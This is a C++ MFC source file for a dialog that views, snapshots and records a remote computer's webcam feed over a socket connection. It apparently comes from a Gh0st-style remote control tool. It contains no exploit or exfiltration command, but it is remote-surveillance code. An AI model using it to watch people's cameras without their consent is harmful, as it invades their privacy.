// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "WebCamDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

enum
{
	IDM_ENABLECOMPRESS = 0x0010,	// 视频压缩
	IDM_SAVEDIB,					// 保存快照
	IDM_SAVEAVI,					// 保存录像
	IDM_SIZE_176_144,				// 视频分辨率, H263只支持这两种
	IDM_SIZE_320_240,
	IDM_SIZE_352_288
};
enum
{
	IDM_WEBCAM_BEGIN = 0x0020
};

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	m_nCount		= 0;
	m_lpbmi			= NULL;
	m_lpScreenDIB	= NULL;
	m_pXvidDec		= NULL;
	m_bRecord = FALSE;
	m_nDeviceNums	= 0;
	m_deviceList	= NULL;
	m_nWebcamSelected	= 0;
	m_width = 320;
	m_height = 240;
	m_iResNum = 0;
	m_bReset = FALSE;
//	m_lpCompressDIB	= NULL;
//	m_pVideoCodec	= NULL;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	
	m_nOldWidth = 0;
	m_nCount = 0;

//	ResetScreen();

}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	//{{AFX_MSG_MAP(CWebCamDlg)
	ON_WM_CLOSE()
// #ifdef NDEBUG
	ON_WM_PAINT()
// #endif
	ON_WM_SYSCOMMAND()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	//}}AFX_MSG_MAP
//	ON_WM_DESTROY()
ON_WM_DESTROY()
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers

void CWebCamDlg::OnReceive()
{
// 	CString str;
// 	str.Format(_T("\\\\%s %d * %d 第%d帧 %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
// 		m_nCount, m_pContext->m_nTransferProgress);
// 	SetWindowText(str);	
}

void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 视频大小调整成功
		ResetScreen();
		break;
	default:
		// 传输发生异常数据
		SendException();
		break;
	}
}

bool CWebCamDlg::SaveSnapshot()
{
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("Bitmap(*.bmp)|*.bmp|"), this);
	if(dlg.DoModal () != IDOK)
		return false;

	BITMAPFILEHEADER	hdr;
//	LPBITMAPINFO		lpbi = m_lpbmi;
	CFile	file;
	if (!file.Open( dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{
		MessageBox(_T("Save File Failed"));
		return false;
	}
	
	// BITMAPINFO大小
//	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
	
	// Fill in the fields of the file header
	hdr.bfType			= ((WORD) ('M' << 8) | 'B');	// is always "BM"
	hdr.bfSize			= m_fmtFrame.biSizeImage + sizeof(hdr) + sizeof( BITMAPINFOHEADER );
	hdr.bfReserved1 	= 0;
	hdr.bfReserved2 	= 0;
	hdr.bfOffBits		= sizeof( BITMAPINFOHEADER ) + sizeof( BITMAPFILEHEADER );
	// Write the file header
	file.Write(&hdr, sizeof(hdr));
	file.Write(&m_fmtFrame, sizeof( BITMAPINFOHEADER ));
	// Write the DIB header and the bits
	file.Write(m_lpScreenDIB, m_fmtFrame.biSizeImage);
	file.Close();
	
	return true;
}



void CWebCamDlg::SaveAvi()
{
	m_bReset = FALSE;
	CMenu	*pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_UNCHECKED);
		m_aviFile = "";
		m_aviStream.Close();
		m_bRecord = FALSE;
		return;
	}

	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
	CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
	if(dlg.DoModal () != IDOK)
		return;
	m_aviFile = dlg.GetPathName();
	if (!m_aviStream.Open(m_aviFile, m_lpbmi))
	{
		m_aviFile = _T("");
		m_bRecord = FALSE;
		MessageBox(_T("Create Video(*.avi) Failed"));	
	}
	else
	{
		SendResetScreen(m_lpbmi->bmiHeader.biWidth,m_lpbmi->bmiHeader.biHeight);
		pSysMenu->CheckMenuItem(IDM_SAVEAVI, MF_CHECKED);
		m_bRecord = TRUE;
	}

}
void CWebCamDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// 如果m_MMI已经被赋值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	// 边框的宽度
	int	nBorderWidth = rectClient.left - rectWindow.left;
	
	rectWindow.right = rectClient.left + nBorderWidth + m_lpbmi->bmiHeader.biWidth;
	rectWindow.bottom = rectClient.top + nBorderWidth + m_lpbmi->bmiHeader.biHeight;

	// 调整窗口到远程大小
 	MoveWindow(&rectWindow);

	int	nTitleWidth = rectClient.top - rectWindow.top; // 标题栏的高度
	int	nWidthAdd = nBorderWidth * 2;
	int	nHeightAdd = nTitleWidth + nBorderWidth;

	int	nMaxWidth = GetSystemMetrics(SM_CXSCREEN);
	int	nMaxHeight = GetSystemMetrics(SM_CYSCREEN);
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	m_MMI.ptMinTrackSize.y = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;

}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// 销毁时移除自己在视图中的数据

	// 如果正在录像，停止
	if (!m_aviFile.IsEmpty())
		SaveAvi();

	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	
// 	if (m_lpCompressDIB)
// 		delete [] m_lpCompressDIB;
// 	if (m_pVideoCodec)
// 		delete m_pVideoCodec;
	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}
	DestroyWindow();
}

BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	ResetScreen();
	char* Device_head = NULL;
	char* Device_end = NULL;
	char* Res_head = NULL;
	char* Res_end = NULL;
//	int	iResNum = 0;
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));//添加右击菜单
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI, _T("录制视频(&R)"));
		pSysMenu->AppendMenu(MF_SEPARATOR);	
		Device_head = m_deviceList;
		for (int i = 0; i < m_nDeviceNums; i++)
		{
			CMenu SubMenu;
			Res_end = NULL;
			Device_end = strchr(Device_head,'$');
			*Device_end = '\0';
			Res_head = strchr(Device_head,'#') + 1;
			*(Res_head - 1) = '\0';
			SubMenu.CreateMenu();
			do
			{
				ResolutionInfo tempInfo;
				char temp;
				tempInfo.m_DeviceIndex = i;
				Res_end = strchr(Res_head,':');
				if(Res_end == NULL)
				{
					break;
				}
				*Res_end = '\0';
				sscanf(Res_head,"%d %c %d",&tempInfo.m_iWidth,&temp,&tempInfo.m_iHeight);
				CString str;
				bool state=1;

				for (int i = 0;i <= m_iResNum;i++)
				{
					SubMenu.GetMenuString(IDM_WEBCAM_BEGIN + i-1,str,MF_BYCOMMAND);
					if (lstrcmp(str,CString(Res_head)) == 0) 
					{
						state = 0;
						break;
					}
						
				}
				if (state)
				{
					SubMenu.AppendMenu(MF_STRING,IDM_WEBCAM_BEGIN + m_iResNum,CString(Res_head));
					m_iResNum++;
				}

				m_resInfo.push_back(tempInfo);
		
				if(Res_end)
				{
					Res_head = Res_end + 1;
				}
				
			}while(Res_end!=NULL);
			pSysMenu->InsertMenu(-1,MF_STRING|MF_POPUP|MF_BYPOSITION,(UINT)SubMenu.m_hMenu,CString(Device_head));
			Device_head = Device_end + 1;
		}
		// 不支持固定的大小，说明远程视频有固定的大小，调整命令失效 
// 		if ((m_lpbmi->bmiHeader.biWidth != 352 && m_lpbmi->bmiHeader.biHeight != 288)
// 			&& (m_lpbmi->bmiHeader.biWidth != 176 && m_lpbmi->bmiHeader.biHeight != 144)
// 			&& (m_lpbmi->bmiHeader.biWidth != 320 && m_lpbmi->bmiHeader.biHeight != 240))
// 		{
// 			pSysMenu->EnableMenuItem(IDM_SIZE_176_144, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 			pSysMenu->EnableMenuItem(IDM_SIZE_320_240, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 			pSysMenu->EnableMenuItem(IDM_SIZE_352_288, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 		}
// 		else
// 			pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_320_240, MF_BYCOMMAND);

	}

	CString str;
	str.Format(_T("\\\\%s (%d * %d)"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	// 初始化窗口大小结构
	InitMMI();

	m_hDD = DrawDibOpen();
	m_hDC = ::GetDC(m_hWnd);
	if (m_pXvidDec == NULL)
	{
		m_pXvidDec = new CXvidDec();
		m_pXvidDec->Open(m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_lpbmi->bmiHeader.biBitCount);
	}

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_ENABLECOMPRESS:
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_ENABLECOMPRESS, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
			bIsChecked = !bIsChecked;
			BYTE	bToken = COMMAND_WEBCAM_ENABLECOMPRESS;
			if (!bIsChecked)
				bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_SAVEAVI:
		SaveAvi();
		break;
// 	case IDM_SIZE_176_144:
// 		{
// 			if (SendResetScreen(176, 144))
// 				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_176_144, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_SIZE_352_288:
// 		{
// 			if (SendResetScreen(352, 288))
// 				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_352_288, MF_BYCOMMAND);
// 		}
// 		break;
// 	case IDM_SIZE_320_240:
// 		{
// 			if (SendResetScreen(320, 240))
// 				pSysMenu->CheckMenuRadioItem(IDM_SIZE_176_144, IDM_SIZE_352_288, IDM_SIZE_320_240, MF_BYCOMMAND);
// 		}
// 		break;
	default:
		{
			if (nID >= IDM_WEBCAM_BEGIN && nID < (IDM_WEBCAM_BEGIN + m_iResNum))
			{
				m_nWebcamSelected = m_resInfo[nID - IDM_WEBCAM_BEGIN].m_DeviceIndex;
				if (SendResetScreen(m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iWidth, m_resInfo[nID - IDM_WEBCAM_BEGIN].m_iHeight))
				{
//						CMenu* pSubMenu = NULL;
//						pSubMenu = pSysMenu->GetSubMenu(0 + m_nWebcamSelected);
//						pSubMenu->CheckMenuRadioItem(IDM_WEBCAM_BEGIN, IDM_WEBCAM_BEGIN + m_iResNum-1, nID, MF_BYCOMMAND);
				}
			}
			else
			{
				CDialog::OnSysCommand(nID, lParam);
			}
		}
	}
}

void CWebCamDlg::SendNext()
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CWebCamDlg::DrawDIB()
{
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu == NULL)
		return;
	// token + IsCompress + m_fccHandler + DIB
	int		nHeadLen = 1 + 1 + 4;

	LPBYTE	lpBuffer = m_pContext->m_DeCompressionBuffer.GetBuffer();
	UINT	nBufferLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	if (lpBuffer[1] == 0) // 没有经过H263压缩的原始数据，不需要解码
	{
		// 第一次，没有压缩，说明服务端不支持指定的解码器
// 		if (m_nCount == 1)
// 		{
// 			pSysMenu->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 		}
// 		pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_UNCHECKED);


		// 写入录像文件
		if (m_bReset && m_bRecord)
		{
			m_aviStream.Write(lpBuffer + nHeadLen,nBufferLen - nHeadLen);
		}
		if(m_pXvidDec)
		{
			m_pXvidDec->Decode(lpBuffer + nHeadLen,nBufferLen - nHeadLen, m_lpScreenDIB);
			DoPaint();
		}
	}
	else // 解码
	{
// 		InitCodec(*(LPDWORD)(lpBuffer + 2));
// 		if (m_pVideoCodec != NULL)
// 		{
// 			pSysMenu->CheckMenuItem(IDM_ENABLECOMPRESS, MF_CHECKED);
// 			memcpy(m_lpCompressDIB, lpBuffer + nHeadLen, nBufferLen - nHeadLen);
// 			m_pVideoCodec->DecodeVideoData(m_lpCompressDIB, nBufferLen - nHeadLen, 
// 				(LPBYTE)m_lpScreenDIB, NULL,  NULL);
//		}
	}
//	OnPaint();
}

//void CWebCamDlg::InitCodec(DWORD fccHandler)
//{
// 	if (m_pVideoCodec != NULL)
// 		return;
// 
// 	m_pVideoCodec = new CVideoCodec;
// 	if (!m_pVideoCodec->InitCompressor(m_lpbmi, fccHandler))
// 	{
// 		delete m_pVideoCodec;
// 		// 置NULL, 发送时判断是否为NULL来判断是否压缩
// 		m_pVideoCodec = NULL;
// 		// 通知服务端不启用压缩
// 		BYTE bToken = COMMAND_WEBCAM_DISABLECOMPRESS;
// 		m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
// 		GetSystemMenu(FALSE)->EnableMenuItem(IDM_ENABLECOMPRESS, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
// 	}	
//}

bool CWebCamDlg::SendResetScreen(int nWidth, int nHeight)
{
	if (GetSystemMenu(FALSE)->GetMenuState(IDM_SAVEAVI, MF_BYCOMMAND) & MF_CHECKED)
	{
//		MessageBox(_T("Please Stop Recording .."),_T("Logion"));
		MessageBox(_T("停止录制视频中..."),_T("提示"));
		return false;
	}
	m_width = nWidth;
	m_height = nHeight;
	BYTE	bPacket[13];
	bPacket[0] = COMMAND_WEBCAM_RESIZE;
	*((LPDWORD)&bPacket[1]) = nWidth;
	*((LPDWORD)&bPacket[5]) = nHeight;
	*((LPDWORD)&bPacket[9]) = m_nWebcamSelected;
	m_iocpServer->Send(m_pContext, bPacket, sizeof(bPacket));

	return true;
}

void CWebCamDlg::ResetScreen()
{
	if (m_pXvidDec)
	{
		m_pXvidDec->Close();
		delete m_pXvidDec;
		m_pXvidDec = NULL;
	}
	if (m_lpbmi)
	{
		delete [] m_lpbmi;
		m_lpbmi = NULL;
	}
	if (m_lpScreenDIB)
	{
		delete[] m_lpScreenDIB;
		m_lpScreenDIB = NULL;
	}

	int	nBmiSize = sizeof(BITMAPINFO);
	int nStrLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - nBmiSize - sizeof(int);
	//	m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi	= (LPBITMAPINFO) new BYTE[nBmiSize];
	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBmiSize);
	memcpy(&m_nDeviceNums,m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize),sizeof(int));
	if (m_deviceList)
	{
		delete[] m_deviceList;
		m_deviceList = NULL;
	}
LPBYTE szBuffe = new BYTE[nStrLen+1];
m_deviceList = (char*) szBuffe;
//	memset(m_deviceList,0,nStrLen+1);
	memcpy(m_deviceList,m_pContext->m_DeCompressionBuffer.GetBuffer(1 + nBmiSize + sizeof(int)),nStrLen);
//#ifdef MY_TEST
	memset(&m_fmtFrame,0,sizeof(BITMAPINFOHEADER));
	m_fmtFrame.biSize = sizeof(BITMAPINFOHEADER);
	m_fmtFrame.biWidth= m_lpbmi->bmiHeader.biWidth;
	m_fmtFrame.biHeight= m_lpbmi->bmiHeader.biHeight;
	m_fmtFrame.biBitCount = 24;
	m_fmtFrame.biPlanes = 1;
	m_fmtFrame.biSizeImage=m_lpbmi->bmiHeader.biWidth*m_lpbmi->bmiHeader.biHeight*3;
// 	#if 0
// 		void* PBits;
// 		m_hBmp = CreateDIBSection(m_hDC, (BITMAPINFO*)&m_fmtFrame, DIB_RGB_COLORS, (void**)&PBits, NULL, 0);
// 		CDC dc;
// 		m_cDc.CreateCompatibleDC(GetDC());
// 		CBitmap * pSaveBmp = m_cDc.SelectObject(CBitmap::FromHandle(m_hBmp));
// 	#endif	
// #else
// 	m_bitmap.CreateCompatibleBitmap(this->GetDC(), m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
// 	m_cDc.CreateCompatibleDC(GetDC());
// 	m_cDc.SelectObject(&m_bitmap);
// #endif
	m_pXvidDec = new CXvidDec();
	m_pXvidDec->Open(m_fmtFrame.biWidth, m_fmtFrame.biHeight, m_fmtFrame.biBitCount);
	
	m_lpScreenDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
//	m_lpCompressDIB	= new BYTE[m_lpbmi->bmiHeader.biSizeImage];
	
	memset(&m_MMI, 0, sizeof(MINMAXINFO));
	if (IsWindowVisible())
		InitMMI();
	CString str;
	str.Format(_T("\\\\%s (%d * %d)"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);
	m_bReset = TRUE;
}

void CWebCamDlg::PostDecHandler(unsigned char * image, int used_bytes)
{
#ifdef MY_TEST
	#if 0
		// 生成当前路径下的文件名
		char m_szFileName[256] = {0};
		sprintf(m_szFileName, "C:\\testlog\\%d.bmp", GetTickCount()) ; 
		// 生成bmp文件
		HANDLE hf = CreateFile(
			m_szFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL,
			CREATE_ALWAYS, NULL, NULL );
		// 写文件头 
		BITMAPFILEHEADER bfh;
		memset( &bfh, 0, sizeof( bfh ) );
		bfh.bfType = 'MB';
		bfh.bfSize = sizeof( bfh ) + m_lpbmi->bmiHeader.biSizeImage + sizeof( BITMAPINFOHEADER );
		bfh.bfOffBits = sizeof( BITMAPINFOHEADER ) + sizeof( BITMAPFILEHEADER );
		DWORD dwWritten = 0;
		WriteFile( hf, &bfh, sizeof( bfh ), &dwWritten, NULL );
		// 写位图格式
		BITMAPINFOHEADER bih;
		memset( &bih, 0, sizeof( bih ) );
		bih.biSize = sizeof( bih );
		bih.biWidth = m_lpbmi->bmiHeader.biWidth;
		bih.biHeight = m_lpbmi->bmiHeader.biHeight;
		bih.biPlanes = 1;
		bih.biBitCount = 24;
		WriteFile( hf, &bih, sizeof( bih ), &dwWritten, NULL );
		// 写位图数据
		WriteFile( hf, image, m_lpbmi->bmiHeader.biSizeImage, &dwWritten, NULL );
		CloseHandle( hf );
	#endif
	#if 1
		memcpy(m_lpScreenDIB,image,m_fmtFrame.biSizeImage);
	#else
		SetDIBits(m_hDC, m_hBmp, 0, 240, image, (BITMAPINFO*)&m_fmtFrame, DIB_RGB_COLORS);
	#endif

#else
	m_bitmap.SetBitmapBits(m_lpbmi->bmiHeader.biSizeImage,image);
#endif
// #ifdef NDEBUG
// 	OnPaint();
// #else
	DoPaint();
//#endif
}

void CWebCamDlg::DoPaint() 
{
	// TODO: Add your message handler code here
	RECT rect;
	GetClientRect(&rect);
#ifdef MY_TEST
#if 0
	StretchDIBits(m_hDC,0,0,320,240,0,0,320,240,m_lpScreenDIB,(BITMAPINFO*)&m_fmtFrame,DIB_RGB_COLORS,SRCCOPY);
#else
	if (m_lpbmi == NULL)
	{
		return;
	}
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)&m_fmtFrame,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);
#endif

#if 0
	GetDC()->StretchBlt(0, 0, rect.right, rect.bottom,
 			&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
#endif
#else
	GetDC()->StretchBlt(0, rect.bottom, rect.right, -rect.bottom,
 			&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
#endif
	
	LPCTSTR	lpTipsString = _T("录制视频中...");//Recording ...
	// 写入录像文件
	if (!m_aviFile.IsEmpty())
	{
//		m_aviStream.Write(m_lpScreenDIB);
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}

//#ifdef NDEBUG
void CWebCamDlg::OnPaint() 
{
	// TODO: Add your message handler code here
	CPaintDC dc(this); // device context for painting
	RECT rect;
	GetClientRect(&rect);
#ifdef MY_TEST
#if 0
	StretchDIBits(m_hDC,0,0,320,240,0,0,320,240,m_lpScreenDIB,(BITMAPINFO*)&m_fmtFrame,DIB_RGB_COLORS,SRCCOPY);
#else
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		(LPBITMAPINFOHEADER)&m_fmtFrame,
		m_lpScreenDIB,
		0, 0,
		m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, 
		DDF_SAME_HDC
		);
#endif

#if 0
	GetDC()->StretchBlt(0, 0, rect.right, rect.bottom,
		&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
#endif
#else
	GetDC()->StretchBlt(0, rect.bottom, rect.right, -rect.bottom,
		&m_cDc,0,0,m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,SRCCOPY);
#endif

	LPCTSTR	lpTipsString = _T("录制视频中...");//Recording ...
	// 写入录像文件
	if (m_bRecord)
	{
		//		m_aviStream.Write(m_lpScreenDIB);
		// 提示正在录像
		SetBkMode(m_hDC, TRANSPARENT);
		SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
	}

	// Do not call CDialog::OnPaint() for painting messages
}
//#endif

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	if (!IsWindowVisible())
		return;

	// 按比例调整窗口大小
	int	x = m_lpbmi->bmiHeader.biWidth, y = m_lpbmi->bmiHeader.biHeight; // x:y

	RECT	rectClientToScreen, rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	GetClientRect(&rectClientToScreen);
	ClientToScreen(&rectClientToScreen);  
	// 边框的宽度
	int	nBorderWidth = rectClientToScreen.left - rectWindow.left;

	int	nWindowWidth = rectWindow.right - rectWindow.left;
	int	nWindowHeight = rectWindow.bottom - rectWindow.top;
	
	// 宽发生变化
	if (m_nOldWidth != nWindowWidth)
		rectWindow.bottom = rectClientToScreen.top + nBorderWidth + (rectClient.right * y) / x;
	else
		rectWindow.right = rectClientToScreen.left + nBorderWidth + (rectClient.bottom * x) / y;
	   
	m_nOldWidth = nWindowWidth;

	MoveWindow(&rectWindow);
	
	DoPaint();
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
// 	if (m_dec)
// 	{
// 		m_dec->Close();
// 		delete m_dec;
// 		m_dec = NULL;
// 	}
// 	if (m_lpbmi) 
// 		delete [] m_lpbmi;
// 	if (m_lpScreenDIB)
// 		delete [] m_lpScreenDIB;
	delete this;
	CDialog::PostNcDestroy();
}


//void CWebCamDlg::OnDestroy()
//{
//	__super::OnDestroy();
//	
//	// TODO: 在此处添加消息处理程序代码
//}


void CWebCamDlg::OnDestroy()
{
	/*__super::*/CDialog::OnDestroy();
	if (m_pXvidDec)
	{
		m_pXvidDec->Close();
		delete m_pXvidDec;
		m_pXvidDec = NULL;
	}
	if (m_lpbmi) 
		delete [] m_lpbmi;
	if (m_lpScreenDIB)
		delete [] m_lpScreenDIB;
	// TODO: 在此处添加消息处理程序代码
}
